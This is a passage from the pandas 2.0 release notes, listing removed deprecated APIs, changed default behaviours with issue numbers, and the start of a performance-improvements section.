:meth:`DataFrame._AXIS_NUMBERS`, :meth:`DataFrame._AXIS_NAMES`, :meth:`Series._AXIS_NUMBERS`, :meth:`Series._AXIS_NAMES` (:issue:`33637`)\n- Removed deprecated :meth:`Index.to_native_types`, use ``obj.astype(str)`` instead (:issue:`36418`)\n- Removed deprecated :meth:`Series.iteritems`, :meth:`DataFrame.iteritems`, use ``obj.items`` instead (:issue:`45321`)\n- Removed deprecated :meth:`DataFrame.lookup` (:issue:`35224`)\n- Removed deprecated :meth:`Series.append`, :meth:`DataFrame.append`, use :func:`concat` instead (:issue:`35407`)\n- Removed deprecated :meth:`Series.iteritems`, :meth:`DataFrame.iteritems` and :meth:`HDFStore.iteritems` use ``obj.items`` instead (:issue:`45321`)\n- Removed deprecated :meth:`DatetimeIndex.union_many` (:issue:`45018`)\n- Removed deprecated ``weekofyear`` and ``week`` attributes of :class:`DatetimeArray`, :class:`DatetimeIndex` and ``dt`` accessor in favor of ``isocalendar().week`` (:issue:`33595`)\n- Removed deprecated :meth:`RangeIndex._start`, :meth:`RangeIndex._stop`, :meth:`RangeIndex._step`, use ``start``, ``stop``, ``step`` instead (:issue:`30482`)\n- Removed deprecated :meth:`DatetimeIndex.to_perioddelta`, Use ``dtindex - dtindex.to_period(freq).to_timestamp()`` instead (:issue:`34853`)\n- Removed deprecated :meth:`.Styler.hide_index` and :meth:`.Styler.hide_columns` (:issue:`49397`)\n- Removed deprecated :meth:`.Styler.set_na_rep` and :meth:`.Styler.set_precision` (:issue:`49397`)\n- Removed deprecated :meth:`.Styler.where` (:issue:`49397`)\n- Removed deprecated :meth:`.Styler.render` (:issue:`49397`)\n- Removed deprecated argument ``col_space`` in :meth:`DataFrame.to_latex` (:issue:`47970`)\n- Removed deprecated argument ``null_color`` in :meth:`.Styler.highlight_null` (:issue:`49397`)\n- Removed deprecated argument ``check_less_precise`` in :meth:`.testing.assert_frame_equal`, :meth:`.testing.assert_extension_array_equal`, :meth:`.testing.assert_series_equal`,  :meth:`.testing.assert_index_equal` (:issue:`30562`)\n- Removed deprecated ``null_counts`` argument in :meth:`DataFrame.info`. Use ``show_counts`` instead (:issue:`37999`)\n- Removed deprecated :meth:`Index.is_monotonic`, and :meth:`Series.is_monotonic`; use ``obj.is_monotonic_increasing`` instead (:issue:`45422`)\n- Removed deprecated :meth:`Index.is_all_dates` (:issue:`36697`)\n- Enforced deprecation disallowing passing a timezone-aware :class:`Timestamp` and ``dtype=\"datetime64[ns]\"`` to :class:`Series` or :class:`DataFrame` constructors (:issue:`41555`)\n- Enforced deprecation disallowing passing a sequence of timezone-aware values and ``dtype=\"datetime64[ns]\"`` to to :class:`Series` or :class:`DataFrame` constructors (:issue:`41555`)\n- Enforced deprecation disallowing ``numpy.ma.mrecords.MaskedRecords`` in the :class:`DataFrame` constructor; pass ``\"{name: data[name] for name in data.dtype.names}`` instead (:issue:`40363`)\n- Enforced deprecation disallowing unit-less \"datetime64\" dtype in :meth:`Series.astype` and :meth:`DataFrame.astype` (:issue:`47844`)\n- Enforced deprecation disallowing using ``.astype`` to convert a ``datetime64[ns]`` :class:`Series`, :class:`DataFrame`, or :class:`DatetimeIndex` to timezone-aware dtype, use ``obj.tz_localize`` or ``ser.dt.tz_localize`` instead (:issue:`39258`)\n- Enforced deprecation disallowing using ``.astype`` to convert a timezone-aware :class:`Series`, :class:`DataFrame`, or :class:`DatetimeIndex` to timezone-naive ``datetime64[ns]`` dtype, use ``obj.tz_localize(None)`` or ``obj.tz_convert(\"UTC\").tz_localize(None)`` instead (:issue:`39258`)\n- Enforced deprecation disallowing passing non boolean argument to sort in :func:`concat` (:issue:`44629`)\n- Removed Date parser functions :func:`~pandas.io.date_converters.parse_date_time`,\n  :func:`~pandas.io.date_converters.parse_date_fields`, :func:`~pandas.io.date_converters.parse_all_fields`\n  and :func:`~pandas.io.date_converters.generic_parser` (:issue:`24518`)\n- Removed argument ``index`` from the :class:`core.arrays.SparseArray` constructor (:issue:`43523`)\n- Remove argument ``squeeze`` from :meth:`DataFrame.groupby` and :meth:`Series.groupby` (:issue:`32380`)\n- Removed deprecated ``apply``, ``apply_index``, ``__call__``, ``onOffset``, and ``isAnchored`` attributes from :class:`DateOffset` (:issue:`34171`)\n- Removed ``keep_tz`` argument in :meth:`DatetimeIndex.to_series` (:issue:`29731`)\n- Remove arguments ``names`` and ``dtype`` from :meth:`Index.copy` and ``levels`` and ``codes`` from :meth:`MultiIndex.copy` (:issue:`35853`, :issue:`36685`)\n- Remove argument ``inplace`` from :meth:`MultiIndex.set_levels` and :meth:`MultiIndex.set_codes` (:issue:`35626`)\n- Removed arguments ``verbose`` and ``encoding`` from :meth:`DataFrame.to_excel` and :meth:`Series.to_excel` (:issue:`47912`)\n- Removed argument ``line_terminator`` from :meth:`DataFrame.to_csv` and :meth:`Series.to_csv`, use ``lineterminator`` instead (:issue:`45302`)\n- Removed argument ``inplace`` from :meth:`DataFrame.set_axis` and :meth:`Series.set_axis`, use ``obj = obj.set_axis(..., copy=False)`` instead (:issue:`48130`)\n- Disallow passing positional arguments to :meth:`MultiIndex.set_levels` and :meth:`MultiIndex.set_codes` (:issue:`41485`)\n- Disallow parsing to Timedelta strings with components with units \"Y\", \"y\", or \"M\", as these do not represent unambiguous durations (:issue:`36838`)\n- Removed :meth:`MultiIndex.is_lexsorted` and :meth:`MultiIndex.lexsort_depth` (:issue:`38701`)\n- Removed argument ``how`` from :meth:`PeriodIndex.astype`, use :meth:`PeriodIndex.to_timestamp` instead (:issue:`37982`)\n- Removed argument ``try_cast`` from :meth:`DataFrame.mask`, :meth:`DataFrame.where`, :meth:`Series.mask` and :meth:`Series.where` (:issue:`38836`)\n- Removed argument ``tz`` from :meth:`Period.to_timestamp`, use ``obj.to_timestamp(...).tz_localize(tz)`` instead (:issue:`34522`)\n- Removed argument ``sort_columns`` in :meth:`DataFrame.plot` and :meth:`Series.plot` (:issue:`47563`)\n- Removed argument ``is_copy`` from :meth:`DataFrame.take` and :meth:`Series.take` (:issue:`30615`)\n- Removed argument ``kind`` from :meth:`Index.get_slice_bound`, :meth:`Index.slice_indexer` and :meth:`Index.slice_locs` (:issue:`41378`)\n- Removed arguments ``prefix``, ``squeeze``, ``error_bad_lines`` and ``warn_bad_lines`` from :func:`read_csv` (:issue:`40413`, :issue:`43427`)\n- Removed arguments ``squeeze`` from :func:`read_excel` (:issue:`43427`)\n- Removed argument ``datetime_is_numeric`` from :meth:`DataFrame.describe` and :meth:`Series.describe` as datetime data will always be summarized as numeric data (:issue:`34798`)\n- Disallow passing list ``key`` to :meth:`Series.xs` and :meth:`DataFrame.xs`, pass a tuple instead (:issue:`41789`)\n- Disallow subclass-specific keywords (e.g. \"freq\", \"tz\", \"names\", \"closed\") in the :class:`Index` constructor (:issue:`38597`)\n- Removed argument ``inplace`` from :meth:`Categorical.remove_unused_categories` (:issue:`37918`)\n- Disallow passing non-round floats to :class:`Timestamp` with ``unit=\"M\"`` or ``unit=\"Y\"`` (:issue:`47266`)\n- Remove keywords ``convert_float`` and ``mangle_dupe_cols`` from :func:`read_excel` (:issue:`41176`)\n- Remove keyword ``mangle_dupe_cols`` from :func:`read_csv` and :func:`read_table` (:issue:`48137`)\n- Removed ``errors`` keyword from :meth:`DataFrame.where`, :meth:`Series.where`, :meth:`DataFrame.mask` and :meth:`Series.mask` (:issue:`47728`)\n- Disallow passing non-keyword arguments to :func:`read_excel` except ``io`` and ``sheet_name`` (:issue:`34418`)\n- Disallow passing non-keyword arguments to :meth:`DataFrame.drop` and :meth:`Series.drop` except ``labels`` (:issue:`41486`)\n- Disallow passing non-keyword arguments to :meth:`DataFrame.fillna` and :meth:`Series.fillna` except ``value`` (:issue:`41485`)\n- Disallow passing non-keyword arguments to :meth:`StringMethods.split` and :meth:`StringMethods.rsplit` except for ``pat`` (:issue:`47448`)\n- Disallow passing non-keyword arguments to :meth:`DataFrame.set_index` except ``keys`` (:issue:`41495`)\n- Disallow passing non-keyword arguments to :meth:`Resampler.interpolate` except ``method`` (:issue:`41699`)\n- Disallow passing non-keyword arguments to :meth:`DataFrame.reset_index` and :meth:`Series.reset_index` except ``level`` (:issue:`41496`)\n- Disallow passing non-keyword arguments to :meth:`DataFrame.dropna` and :meth:`Series.dropna` (:issue:`41504`)\n- Disallow passing non-keyword arguments to :meth:`ExtensionArray.argsort` (:issue:`46134`)\n- Disallow passing non-keyword arguments to :meth:`Categorical.sort_values` (:issue:`47618`)\n- Disallow passing non-keyword arguments to :meth:`Index.drop_duplicates` and :meth:`Series.drop_duplicates` (:issue:`41485`)\n- Disallow passing non-keyword arguments to :meth:`DataFrame.drop_duplicates` except for ``subset`` (:issue:`41485`)\n- Disallow passing non-keyword arguments to :meth:`DataFrame.sort_index` and :meth:`Series.sort_index` (:issue:`41506`)\n- Disallow passing non-keyword arguments to :meth:`DataFrame.interpolate` and :meth:`Series.interpolate` except for ``method`` (:issue:`41510`)\n- Disallow passing non-keyword arguments to :meth:`DataFrame.any` and :meth:`Series.any` (:issue:`44896`)\n- Disallow passing non-keyword arguments to :meth:`Index.set_names` except for ``names`` (:issue:`41551`)\n- Disallow passing non-keyword arguments to :meth:`Index.join` except for ``other`` (:issue:`46518`)\n- Disallow passing non-keyword arguments to :func:`concat` except for ``objs`` (:issue:`41485`)\n- Disallow passing non-keyword arguments to :func:`pivot` except for ``data`` (:issue:`48301`)\n- Disallow passing non-keyword arguments to :meth:`DataFrame.pivot` (:issue:`48301`)\n- Disallow passing non-keyword arguments to :func:`read_html` except for ``io`` (:issue:`27573`)\n- Disallow passing non-keyword arguments to :func:`read_json` except for ``path_or_buf`` (:issue:`27573`)\n- Disallow passing non-keyword arguments to :func:`read_sas` except for ``filepath_or_buffer`` (:issue:`47154`)\n- Disallow passing non-keyword arguments to :func:`read_stata` except for ``filepath_or_buffer`` (:issue:`48128`)\n- Disallow passing non-keyword arguments to :func:`read_csv` except ``filepath_or_buffer`` (:issue:`41485`)\n- Disallow passing non-keyword arguments to :func:`read_table` except ``filepath_or_buffer`` (:issue:`41485`)\n- Disallow passing non-keyword arguments to :func:`read_fwf` except ``filepath_or_buffer`` (:issue:`44710`)\n- Disallow passing non-keyword arguments to :func:`read_xml` except for ``path_or_buffer`` (:issue:`45133`)\n- Disallow passing non-keyword arguments to :meth:`Series.mask` and :meth:`DataFrame.mask` except ``cond`` and ``other`` (:issue:`41580`)\n- Disallow passing non-keyword arguments to :meth:`DataFrame.to_stata` except for ``path`` (:issue:`48128`)\n- Disallow passing non-keyword arguments to :meth:`DataFrame.where` and :meth:`Series.where` except for ``cond`` and ``other`` (:issue:`41523`)\n- Disallow passing non-keyword arguments to :meth:`Series.set_axis` and :meth:`DataFrame.set_axis` except for ``labels`` (:issue:`41491`)\n- Disallow passing non-keyword arguments to :meth:`Series.rename_axis` and :meth:`DataFrame.rename_axis` except for ``mapper`` (:issue:`47587`)\n- Disallow passing non-keyword arguments to :meth:`Series.clip` and :meth:`DataFrame.clip` except ``lower`` and ``upper`` (:issue:`41511`)\n- Disallow passing non-keyword arguments to :meth:`Series.bfill`, :meth:`Series.ffill`, :meth:`DataFrame.bfill` and :meth:`DataFrame.ffill` (:issue:`41508`)\n- Disallow passing non-keyword arguments to :meth:`DataFrame.replace`, :meth:`Series.replace` except for ``to_replace`` and ``value`` (:issue:`47587`)\n- Disallow passing non-keyword arguments to :meth:`DataFrame.sort_values` except for ``by`` (:issue:`41505`)\n- Disallow passing non-keyword arguments to :meth:`Series.sort_values` (:issue:`41505`)\n- Disallow passing non-keyword arguments to :meth:`DataFrame.reindex` except for ``labels`` (:issue:`17966`)\n- Disallow :meth:`Index.reindex` with non-unique :class:`Index` objects (:issue:`42568`)\n- Disallowed constructing :class:`Categorical` with scalar ``data`` (:issue:`38433`)\n- Disallowed constructing :class:`CategoricalIndex` without passing ``data`` (:issue:`38944`)\n- Removed :meth:`.Rolling.validate`, :meth:`.Expanding.validate`, and :meth:`.ExponentialMovingWindow.validate` (:issue:`43665`)\n- Removed :attr:`Rolling.win_type` returning ``\"freq\"`` (:issue:`38963`)\n- Removed :attr:`Rolling.is_datetimelike` (:issue:`38963`)\n- Removed the ``level`` keyword in :class:`DataFrame` and :class:`Series` aggregations; use ``groupby`` instead (:issue:`39983`)\n- Removed deprecated :meth:`Timedelta.delta`, :meth:`Timedelta.is_populated`, and :attr:`Timedelta.freq` (:issue:`46430`, :issue:`46476`)\n- Removed deprecated :attr:`NaT.freq` (:issue:`45071`)\n- Removed deprecated :meth:`Categorical.replace`, use :meth:`Series.replace` instead (:issue:`44929`)\n- Removed the ``numeric_only`` keyword from :meth:`Categorical.min` and :meth:`Categorical.max` in favor of ``skipna`` (:issue:`48821`)\n- Changed behavior of :meth:`DataFrame.median` and :meth:`DataFrame.mean` with ``numeric_only=None`` to not exclude datetime-like columns THIS NOTE WILL BE IRRELEVANT ONCE ``numeric_only=None`` DEPRECATION IS ENFORCED (:issue:`29941`)\n- Removed :func:`is_extension_type` in favor of :func:`is_extension_array_dtype` (:issue:`29457`)\n- Removed ``.ExponentialMovingWindow.vol`` (:issue:`39220`)\n- Removed :meth:`Index.get_value` and :meth:`Index.set_value` (:issue:`33907`, :issue:`28621`)\n- Removed :meth:`Series.slice_shift` and :meth:`DataFrame.slice_shift` (:issue:`37601`)\n- Remove :meth:`DataFrameGroupBy.pad` and :meth:`DataFrameGroupBy.backfill` (:issue:`45076`)\n- Remove ``numpy`` argument from :func:`read_json` (:issue:`30636`)\n- Disallow passing abbreviations for ``orient`` in :meth:`DataFrame.to_dict` (:issue:`32516`)\n- Disallow partial slicing on an non-monotonic :class:`DatetimeIndex` with keys which are not in Index. This now raises a ``KeyError`` (:issue:`18531`)\n- Removed ``get_offset`` in favor of :func:`to_offset` (:issue:`30340`)\n- Removed the ``warn`` keyword in :func:`infer_freq` (:issue:`45947`)\n- Removed the ``include_start`` and ``include_end`` arguments in :meth:`DataFrame.between_time` in favor of ``inclusive`` (:issue:`43248`)\n- Removed the ``closed`` argument in :meth:`date_range` and :meth:`bdate_range` in favor of ``inclusive`` argument (:issue:`40245`)\n- Removed the ``center`` keyword in :meth:`DataFrame.expanding` (:issue:`20647`)\n- Removed the ``truediv`` keyword from :func:`eval` (:issue:`29812`)\n- Removed the ``method`` and ``tolerance`` arguments in :meth:`Index.get_loc`. Use ``index.get_indexer([label], method=..., tolerance=...)`` instead (:issue:`42269`)\n- Removed the ``pandas.datetime`` submodule (:issue:`30489`)\n- Removed the ``pandas.np`` submodule (:issue:`30296`)\n- Removed ``pandas.util.testing`` in favor of ``pandas.testing`` (:issue:`30745`)\n- Removed :meth:`Series.str.__iter__` (:issue:`28277`)\n- Removed ``pandas.SparseArray`` in favor of :class:`arrays.SparseArray` (:issue:`30642`)\n- Removed ``pandas.SparseSeries`` and ``pandas.SparseDataFrame``, including pickle support. (:issue:`30642`)\n- Enforced disallowing passing an integer ``fill_value`` to :meth:`DataFrame.shift` and :meth:`Series.shift`` with datetime64, timedelta64, or period dtypes (:issue:`32591`)\n- Enforced disallowing a string column label into ``times`` in :meth:`DataFrame.ewm` (:issue:`43265`)\n- Enforced disallowing passing ``True`` and ``False`` into ``inclusive`` in :meth:`Series.between` in favor of ``\"both\"`` and ``\"neither\"`` respectively (:issue:`40628`)\n- Enforced disallowing using ``usecols`` with out of bounds indices for ``read_csv`` with ``engine=\"c\"`` (:issue:`25623`)\n- Enforced disallowing the use of ``**kwargs`` in :class:`.ExcelWriter`; use the keyword argument ``engine_kwargs`` instead (:issue:`40430`)\n- Enforced disallowing a tuple of column labels into :meth:`.DataFrameGroupBy.__getitem__` (:issue:`30546`)\n- Enforced disallowing missing labels when indexing with a sequence of labels on a level of a :class:`MultiIndex`. This now raises a ``KeyError`` (:issue:`42351`)\n- Enforced disallowing setting values with ``.loc`` using a positional slice. Use ``.loc`` with labels or ``.iloc`` with positions instead (:issue:`31840`)\n- Enforced disallowing positional indexing with a ``float`` key even if that key is a round number, manually cast to integer instead (:issue:`34193`)\n- Enforced disallowing using a :class:`DataFrame` indexer with ``.iloc``, use ``.loc`` instead for automatic alignment (:issue:`39022`)\n- Enforced disallowing ``set`` or ``dict`` indexers in ``__getitem__`` and ``__setitem__`` methods (:issue:`42825`)\n- Enforced disallowing indexing on a :class:`Index` or positional indexing on a :class:`Series` producing multi-dimensional objects e.g. ``obj[:, None]``, convert to numpy before indexing instead (:issue:`35141`)\n- Enforced disallowing ``dict`` or ``set`` objects in ``suffixes`` in :func:`merge` (:issue:`34810`)\n- Enforced disallowing :func:`merge` to produce duplicated columns through the ``suffixes`` keyword and already existing columns (:issue:`22818`)\n- Enforced disallowing using :func:`merge` or :func:`join` on a different number of levels (:issue:`34862`)\n- Enforced disallowing ``value_name`` argument in :func:`DataFrame.melt` to match an element in the :class:`DataFrame` columns (:issue:`35003`)\n- Enforced disallowing passing ``showindex`` into ``**kwargs`` in :func:`DataFrame.to_markdown` and :func:`Series.to_markdown` in favor of ``index`` (:issue:`33091`)\n- Removed setting Categorical._codes directly (:issue:`41429`)\n- Removed setting Categorical.categories directly (:issue:`47834`)\n- Removed argument ``inplace`` from :meth:`Categorical.add_categories`, :meth:`Categorical.remove_categories`, :meth:`Categorical.set_categories`, :meth:`Categorical.rename_categories`, :meth:`Categorical.reorder_categories`, :meth:`Categorical.set_ordered`, :meth:`Categorical.as_ordered`, :meth:`Categorical.as_unordered` (:issue:`37981`, :issue:`41118`, :issue:`41133`, :issue:`47834`)\n- Enforced :meth:`Rolling.count` with ``min_periods=None`` to default to the size of the window (:issue:`31302`)\n- Renamed ``fname`` to ``path`` in :meth:`DataFrame.to_parquet`, :meth:`DataFrame.to_stata` and :meth:`DataFrame.to_feather` (:issue:`30338`)\n- Enforced disallowing indexing a :class:`Series` with a single item list with a slice (e.g. ``ser[[slice(0, 2)]]``). Either convert the list to tuple, or pass the slice directly instead (:issue:`31333`)\n- Changed behavior indexing on a :class:`DataFrame` with a :class:`DatetimeIndex` index using a string indexer, previously this operated as a slice on rows, now it operates like any other column key; use ``frame.loc[key]`` for the old behavior (:issue:`36179`)\n- Enforced the ``display.max_colwidth`` option to not accept negative integers (:issue:`31569`)\n- Removed the ``display.column_space`` option in favor of ``df.to_string(col_space=...)`` (:issue:`47280`)\n- Removed the deprecated method ``mad`` from pandas classes (:issue:`11787`)\n- Removed the deprecated method ``tshift`` from pandas classes (:issue:`11631`)\n- Changed behavior of empty data passed into :class:`Series`; the default dtype will be ``object`` instead of ``float64`` (:issue:`29405`)\n- Changed the behavior of :meth:`DatetimeIndex.union`, :meth:`DatetimeIndex.intersection`, and :meth:`DatetimeIndex.symmetric_difference` with mismatched timezones to convert to UTC instead of casting to object dtype (:issue:`39328`)\n- Changed the behavior of :func:`to_datetime` with argument \"now\" with ``utc=False`` to match ``Timestamp(\"now\")`` (:issue:`18705`)\n- Changed the behavior of indexing on a timezone-aware :class:`DatetimeIndex` with a timezone-naive ``datetime`` object or vice-versa; these now behave like any other non-comparable type by raising ``KeyError`` (:issue:`36148`)\n- Changed the behavior of :meth:`Index.reindex`, :meth:`Series.reindex`, and :meth:`DataFrame.reindex` with a ``datetime64`` dtype and a ``datetime.date`` object for ``fill_value``; these are no longer considered equivalent to ``datetime.datetime`` objects so the reindex casts to object dtype (:issue:`39767`)\n- Changed behavior of :meth:`SparseArray.astype` when given a dtype that is not explicitly ``SparseDtype``, cast to the exact requested dtype rather than silently using a ``SparseDtype`` instead (:issue:`34457`)\n- Changed behavior of :meth:`Index.ravel` to return a view on the original :class:`Index` instead of a ``np.ndarray`` (:issue:`36900`)\n- Changed behavior of :meth:`Series.to_frame` and :meth:`Index.to_frame` with explicit ``name=None`` to use ``None`` for the column name instead of the index's name or default ``0`` (:issue:`45523`)\n- Changed behavior of :func:`concat` with one array of ``bool``-dtype and another of integer dtype, this now returns ``object`` dtype instead of integer dtype; explicitly cast the bool object to integer before concatenating to get the old behavior (:issue:`45101`)\n- Changed behavior of :class:`DataFrame` constructor given floating-point ``data`` and an integer ``dtype``, when the data cannot be cast losslessly, the floating point dtype is retained, matching :class:`Series` behavior (:issue:`41170`)\n- Changed behavior of :class:`Index` constructor when given a ``np.ndarray`` with object-dtype containing numeric entries; this now retains object dtype rather than inferring a numeric dtype, consistent with :class:`Series` behavior (:issue:`42870`)\n- Changed behavior of :meth:`Index.__and__`, :meth:`Index.__or__` and :meth:`Index.__xor__` to behave as logical operations (matching :class:`Series` behavior) instead of aliases for set operations (:issue:`37374`)\n- Changed behavior of :class:`DataFrame` constructor when passed a list whose first element is a :class:`Categorical`, this now treats the elements as rows casting to ``object`` dtype, consistent with behavior for other types (:issue:`38845`)\n- Changed behavior of :class:`DataFrame` constructor when passed a ``dtype`` (other than int) that the data cannot be cast to; it now raises instead of silently ignoring the dtype (:issue:`41733`)\n- Changed the behavior of :class:`Series` constructor, it will no longer infer a datetime64 or timedelta64 dtype from string entries (:issue:`41731`)\n- Changed behavior of :class:`Timestamp` constructor with a ``np.datetime64`` object and a ``tz`` passed to interpret the input as a wall-time as opposed to a UTC time (:issue:`42288`)\n- Changed behavior of :meth:`Timestamp.utcfromtimestamp` to return a timezone-aware object satisfying ``Timestamp.utcfromtimestamp(val).timestamp() == val`` (:issue:`45083`)\n- Changed behavior of :class:`Index` constructor when passed a ``SparseArray`` or ``SparseDtype`` to retain that dtype instead of casting to ``numpy.ndarray`` (:issue:`43930`)\n- Changed behavior of setitem-like operations (``__setitem__``, ``fillna``, ``where``, ``mask``, ``replace``, ``insert``, fill_value for ``shift``) on an object with :class:`DatetimeTZDtype` when using a value with a non-matching timezone, the value will be cast to the object's timezone instead of casting both to object-dtype (:issue:`44243`)\n- Changed behavior of :class:`Index`, :class:`Series`, :class:`DataFrame` constructors with floating-dtype data and a :class:`DatetimeTZDtype`, the data are now interpreted as UTC-times instead of wall-times, consistent with how integer-dtype data are treated (:issue:`45573`)\n- Changed behavior of :class:`Series` and :class:`DataFrame` constructors with integer dtype and floating-point data containing ``NaN``, this now raises ``IntCastingNaNError`` (:issue:`40110`)\n- Changed behavior of :class:`Series` and :class:`DataFrame` constructors with an integer ``dtype`` and values that are too large to losslessly cast to this dtype, this now raises ``ValueError`` (:issue:`41734`)\n- Changed behavior of :class:`Series` and :class:`DataFrame` constructors with an integer ``dtype`` and values having either ``datetime64`` or ``timedelta64`` dtypes, this now raises ``TypeError``, use ``values.view(\"int64\")`` instead (:issue:`41770`)\n- Removed the deprecated ``base`` and ``loffset`` arguments from :meth:`pandas.DataFrame.resample`, :meth:`pandas.Series.resample` and :class:`pandas.Grouper`. Use ``offset`` or ``origin`` instead (:issue:`31809`)\n- Changed behavior of :meth:`Series.fillna` and :meth:`DataFrame.fillna` with ``timedelta64[ns]`` dtype and an incompatible ``fill_value``; this now casts to ``object`` dtype instead of raising, consistent with the behavior with other dtypes (:issue:`45746`)\n- Change the default argument of ``regex`` for :meth:`Series.str.replace` from ``True`` to ``False``. Additionally, a single character ``pat`` with ``regex=True`` is now treated as a regular expression instead of a string literal. (:issue:`36695`, :issue:`24804`)\n- Changed behavior of :meth:`DataFrame.any` and :meth:`DataFrame.all` with ``bool_only=True``; object-dtype columns with all-bool values will no longer be included, manually cast to ``bool`` dtype first (:issue:`46188`)\n- Changed behavior of :meth:`DataFrame.max`, :class:`DataFrame.min`, :class:`DataFrame.mean`, :class:`DataFrame.median`, :class:`DataFrame.skew`, :class:`DataFrame.kurt` with ``axis=None`` to return a scalar applying the aggregation across both axes (:issue:`45072`)\n- Changed behavior of comparison of a :class:`Timestamp` with a ``datetime.date`` object; these now compare as un-equal and raise on inequality comparisons, matching the ``datetime.datetime`` behavior (:issue:`36131`)\n- Changed behavior of comparison of ``NaT`` with a ``datetime.date`` object; these now raise on inequality comparisons (:issue:`39196`)\n- Enforced deprecation of silently dropping columns that raised a ``TypeError`` in :class:`Series.transform` and :class:`DataFrame.transform` when used with a list or dictionary (:issue:`43740`)\n- Changed behavior of :meth:`DataFrame.apply` with list-like so that any partial failure will raise an error (:issue:`43740`)\n- Changed behaviour of :meth:`DataFrame.to_latex` to now use the Styler implementation via :meth:`.Styler.to_latex` (:issue:`47970`)\n- Changed behavior of :meth:`Series.__setitem__` with an integer key and a :class:`Float64Index` when the key is not present in the index; previously we treated the key as positional (behaving like ``series.iloc[key] = val``), now we treat it is a label (behaving like ``series.loc[key] = val``), consistent with :meth:`Series.__getitem__`` behavior (:issue:`33469`)\n- Removed ``na_sentinel`` argument from :func:`factorize`, :meth:`.Index.factorize`, and :meth:`.ExtensionArray.factorize` (:issue:`47157`)\n- Changed behavior of :meth:`Series.diff` and :meth:`DataFrame.diff` with :class:`ExtensionDtype` dtypes whose arrays do not implement ``diff``, these now raise ``TypeError`` rather than casting to numpy (:issue:`31025`)\n- Enforced deprecation of calling numpy \"ufunc\"s on :class:`DataFrame` with ``method=\"outer\"``; this now raises ``NotImplementedError`` (:issue:`36955`)\n- Enforced deprecation disallowing passing ``numeric_only=True`` to :class:`Series` reductions (``rank``, ``any``, ``all``, ...) with non-numeric dtype (:issue:`47500`)\n- Changed behavior of :meth:`.DataFrameGroupBy.apply` and :meth:`.SeriesGroupBy.apply` so that ``group_keys`` is respected even if a transformer is detected (:issue:`34998`)\n- Comparisons between a :class:`DataFrame` and a :class:`Series` where the frame's columns do not match the series's index raise ``ValueError`` instead of automatically aligning, do ``left, right = left.align(right, axis=1, copy=False)`` before comparing (:issue:`36795`)\n- Enforced deprecation ``numeric_only=None`` (the default) in DataFrame reductions that would silently drop columns that raised; ``numeric_only`` now defaults to ``False`` (:issue:`41480`)\n- Changed default of ``numeric_only`` to ``False`` in all DataFrame methods with that argument (:issue:`46096`, :issue:`46906`)\n- Changed default of ``numeric_only`` to ``False`` in :meth:`Series.rank` (:issue:`47561`)\n- Enforced deprecation of silently dropping nuisance columns in groupby and resample operations when ``numeric_only=False`` (:issue:`41475`)\n- Enforced deprecation of silently dropping nuisance columns in :class:`Rolling`, :class:`Expanding`, and :class:`ExponentialMovingWindow` ops. This will now raise a :class:`.errors.DataError` (:issue:`42834`)\n- Changed behavior in setting values with ``df.loc[:, foo] = bar`` or ``df.iloc[:, foo] = bar``, these now always attempt to set values inplace before falling back to casting (:issue:`45333`)\n- Changed default of ``numeric_only`` in various :class:`.DataFrameGroupBy` methods; all methods now default to ``numeric_only=False`` (:issue:`46072`)\n- Changed default of ``numeric_only`` to ``False`` in :class:`.Resampler` methods (:issue:`47177`)\n- Using the method :meth:`.DataFrameGroupBy.transform` with a callable that returns DataFrames will align to the input's index (:issue:`47244`)\n- When providing a list of columns of length one to :meth:`DataFrame.groupby`, the keys that are returned by iterating over the resulting :class:`DataFrameGroupBy` object will now be tuples of length one (:issue:`47761`)\n- Removed deprecated methods :meth:`ExcelWriter.write_cells`, :meth:`ExcelWriter.save`, :meth:`ExcelWriter.cur_sheet`, :meth:`ExcelWriter.handles`, :meth:`ExcelWriter.path` (:issue:`45795`)\n- The :class:`ExcelWriter` attribute ``book`` can no longer be set; it is still available to be accessed and mutated (:issue:`48943`)\n- Removed unused ``*args`` and ``**kwargs`` in :class:`Rolling`, :class:`Expanding`, and :class:`ExponentialMovingWindow` ops (:issue:`47851`)\n- Removed the deprecated argument ``line_terminator`` from :meth:`DataFrame.to_csv` (:issue:`45302`)\n- Removed the deprecated argument ``label`` from :func:`lreshape` (:issue:`30219`)\n- Arguments after ``expr`` in :meth:`DataFrame.eval` and :meth:`DataFrame.query` are keyword-only (:issue:`47587`)\n- Removed :meth:`Index._get_attributes_dict` (:issue:`50648`)\n- Removed :meth:`Series.__array_wrap__` (:issue:`50648`)\n- Changed behavior of :meth:`.DataFrame.value_counts` to return a :class:`Series` with :class:`MultiIndex` for any list-like(one element or not) but an :class:`Index` for a single label (:issue:`50829`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_200.performance:\n\nPerformance improvements\n~~~~~~~~~~~~~~~~~~~~~~~~\n- Performance improvement in :meth:`.DataFrameGroupBy.median` and :meth:`.SeriesGroupBy.median` and :meth:`.DataFrameGroupBy.cumprod` for nullable dtypes (:issue:`37493`)\n- Performance improvement in :meth:`.DataFrameGroupBy.all`, :meth:`.DataFrameGroupBy.any`, :meth:`.SeriesGroupBy.all`, and :meth:`.SeriesGroupBy.any` for object dtype (:issue:`50623`)\n- Performance improvement in :meth:`MultiIndex.argsort` and :meth:`MultiIndex.sort_values` (:issue:`48406`)\n- Performance improvement in :meth:`MultiIndex.size` (:issue:`48723`)\n- Performance improvement in :meth:`MultiIndex.union` without missing values and without duplicates (:issue:`48505`, :issue:`48752`)\n- Performance improvement in :meth:`MultiIndex.difference` (:issue:`48606`)\n- Performance improvement in :class:`MultiIndex` set operations with sort=None (:issue:`49010`)\n- Performance improvement in :meth:`.DataFrameGroupBy.mean`, :meth:`.SeriesGroupBy.mean`, :meth:`.DataFrameGroupBy.var`, and :meth:`.SeriesGroupBy.var` for extension array dtypes (:issue:`37493`)\n- Performance improvement in :meth:`MultiIndex.isin` when ``level=None`` (:issue:`48622`, :issue:`49577`)\n- Performance improvement in :meth:`MultiIndex.putmask` (:issue:`49830`)\n- Performance improvement in :meth:`Index.union` and :meth:`MultiIndex.union` when index contains duplicates (:issue:`48900`)\n- Performance improvement in :meth:`Series.rank` for pyarrow-backed dtypes (:issue:`50264`)\n- Performance improvement in :meth:`Series.searchsorted` for pyarrow-backed dtypes (:issue:`50447`)\n- Performance improvement in :meth:`Series.fillna` for extension array dtypes (:issue:`49722`, :issue:`50078`)\n- Performance improvement in :meth:`Index.join`, :meth:`Index.intersection` and :meth:`Index.union` for masked and arrow dtypes when :class:`Index` is monotonic (:issue:`50310`, :issue:`51365`)\n- Performance improvement for :meth:`Series.value_counts` with nullable dtype 